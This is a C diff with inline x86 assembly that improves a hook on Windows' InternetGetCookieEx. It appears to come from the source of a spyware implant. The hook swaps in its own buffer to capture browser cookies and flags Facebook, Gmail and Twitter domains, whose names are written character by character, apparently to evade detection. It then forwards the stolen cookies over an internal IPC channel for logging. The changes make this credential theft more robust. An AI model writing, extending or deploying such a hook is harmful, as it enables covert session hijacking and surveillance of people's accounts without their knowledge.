@@ -393,9 +393,10 @@ void GetURLBarContent(HWND hWnd, DWORD browser_type)
 
 
 typedef WCHAR * (WINAPI *StrStrW_t) (WCHAR *, WCHAR *);
+#define MAX_COOKIE_SIZE 2048
 typedef struct {
 	COMMONDATA;
-	WCHAR local_cookie[2048];
+	WCHAR local_cookie[MAX_COOKIE_SIZE];
 	StrStrW_t pStrStrW;
 } InternetGetCookieExStruct;
 InternetGetCookieExStruct InternetGetCookieExData;
@@ -413,7 +414,8 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 	DWORD origin;
 	DWORD old_flags;
 	DWORD old_size;
-	DWORD old_buffer;
+	WCHAR *old_buffer;
+	WCHAR *old_cname;
 	
 	MARK_HOOK
 	INIT_WRAPPER(InternetGetCookieExStruct)
@@ -421,13 +423,13 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 	WCHAR facebook_url[] = { L'f', L'a', L'c', L'e', L'b', L'o', L'o', L'k', L'.', L'c', L'o', L'm', L'/', 0 };
 	WCHAR gmail_url[] = { L'm', L'a', L'i', L'l', L'.', L'g', L'o', L'o', L'g', L'l', L'e', L'.', L'c', L'o', L'm', L'/', 0 };
 	WCHAR twitter_url[] = { L't', L'w', L'i', L't', L't', L'e', L'r', L'.', L'c', L'o', L'm', L'/', 0 };
-	DWORD local_size = 2048;
+	DWORD local_size = MAX_COOKIE_SIZE-1;
 	WCHAR *local_cookie;
 
 	// Cerca di capire se si tratta di un dominio interessante
 	local_cookie = pData->local_cookie;
 	origin = COOKIE_IEXPLORER;
-	if (pData->pStrStrW && lpszCookieData && lpszURL) {
+	if (pData->pStrStrW && lpszCookieData && lpszURL && lpdwSize) {
 		if (pData->pStrStrW((WCHAR *)lpszURL, facebook_url))
 			origin |= COOKIE_FACEBOOK;
 		else if (pData->pStrStrW((WCHAR *)lpszURL, gmail_url))
@@ -449,6 +451,8 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 		MOV [old_size], EAX
 		MOV EAX, DWORD PTR [EBP+0x10]
 		MOV [old_buffer], EAX
+		MOV EAX, DWORD PTR [EBP+0x0C]
+		MOV [old_cname], EAX
 
 		MOV EAX, 0x00002000
 		MOV DWORD PTR [EBP+0x18], EAX
@@ -456,26 +460,39 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 		MOV DWORD PTR [EBP+0x14], EAX
 		MOV EAX, local_cookie
 		MOV DWORD PTR [EBP+0x10], EAX
+		XOR EAX, EAX
+		MOV DWORD PTR [EBP+0x0C], EAX
 
 		POP EAX
 	}
+
+	local_cookie[0] = 0;
 
 	CALL_ORIGINAL_API_SEQ(6)
 
 	if (ret_code) {
 		WCSLEN(local_cookie, name_len);
-		pData->pHM_IpcCliWrite(PM_URLLOG, (BYTE *)local_cookie, (name_len+1)*sizeof(WCHAR), origin, IPC_DEF_PRIORITY);
+		if (name_len > 0) {
+			name_len = (name_len+1)*sizeof(WCHAR);
+			// Spero che tagliando rimanga la parte importante di cookie...
+			if (name_len > MAX_MSG_LEN)
+				name_len = MAX_MSG_LEN;
+			pData->pHM_IpcCliWrite(PM_URLLOG, (BYTE *)local_cookie, name_len, origin, IPC_DEF_PRIORITY);
+		}
 	}
 
 	// Rimette i parametri originali e richiama la funzione
 	__asm {
 		PUSH EAX
-		MOV EAX, [old_size]
-		MOV DWORD PTR [EBP+0x14], EAX
+
 		MOV EAX, [old_flags]
 		MOV DWORD PTR [EBP+0x18], EAX
+		MOV EAX, [old_size]
+		MOV DWORD PTR [EBP+0x14], EAX
 		MOV EAX, [old_buffer]
 		MOV DWORD PTR [EBP+0x10], EAX
+		MOV EAX, [old_cname]
+		MOV DWORD PTR [EBP+0x0C], EAX
 
 		POP EAX
 	}
@@ -502,6 +519,7 @@ DWORD PM_InternetGetCookieEx_setup(HMServiceStruct *pData)
 	VALIDPTR(hMod = LoadLibrary("Shlwapi.dll"))
 	VALIDPTR(InternetGetCookieExData.pStrStrW = (StrStrW_t) HM_SafeGetProcAddress(hMod, "StrStrW"))
 
+	ZeroMemory(InternetGetCookieExData.local_cookie, sizeof(InternetGetCookieExData.local_cookie));
 	InternetGetCookieExData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
 	InternetGetCookieExData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
 	InternetGetCookieExData.dwHookLen = 990;
@@ -514,6 +532,10 @@ DWORD __stdcall PM_UrlLogDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETI
 	DWORD origin = COOKIE_MASK;
 	DWORD size = sizeof(FACEBOOK_IE_COOKIE)-sizeof(WCHAR);
 	origin = dwFlags & (~origin);
+
+	if (dwLen < 4)
+		return 1;
+
 	if (origin == COOKIE_IEXPLORER) {
 		origin = dwFlags & COOKIE_MASK;
 		if (size > dwLen)
